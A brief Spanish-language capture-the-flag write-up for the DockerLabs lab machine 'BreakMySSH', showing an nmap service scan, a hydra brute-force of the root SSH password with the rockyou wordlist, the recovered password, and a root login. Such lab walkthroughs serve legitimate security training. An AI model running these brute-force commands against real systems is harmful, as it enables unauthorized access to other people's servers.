# DockerLabs - BreakMySSH
## Resumen
* **Dificultad:** Muy facil
* **Tiempo:** ~15 minutos
* **Fecha:** 21/04/26
## Info
| | |
|-------|-------|
| IP | 172.17.0.2 |
| OS | Linux (Docker) |
| Puertos abiertos | 22 (tcp) |
## Reconocimiento de puertos 
Ejecutamos un ```nmap``` para ver los puertos que estan abiertos y con el parametro -sV para ver sus versiones tambien.
```bash
nmap -sV 172.17.0.2
```
Resultado:
| Puerto | Servicio | Version |
|--------|--------|-------|
| 22 | tcp | OpenSSH 7.7 |
## Explotacion 
Probamos por fuerza bruta a sacar la contraseña con el usuario ```root``` usando ```hydra```
```bash
hydra -l root -P /usr/share/worlists/rockyou.txt ssh://172.17.0.2
```
>-l se usa para decir el usuario que va a buscar y -P para que busque todas las contraseñas posibles en la lista que le decimos.
<img width="789" height="124" alt="image" src="https://github.com/user-attachments/assets/7e69abcd-ac62-4ccb-adc5-3cac5837bc50" />
Nos encuentra la contraseña estrella para el usuario root.
## Acceso por SSH
Una vez con el usuario y contraseña accedemos mediante SSH.
```bash
ssh root@172.17.0.2
# Password: estrella
```
Maquina resuelta - Se accede como root.
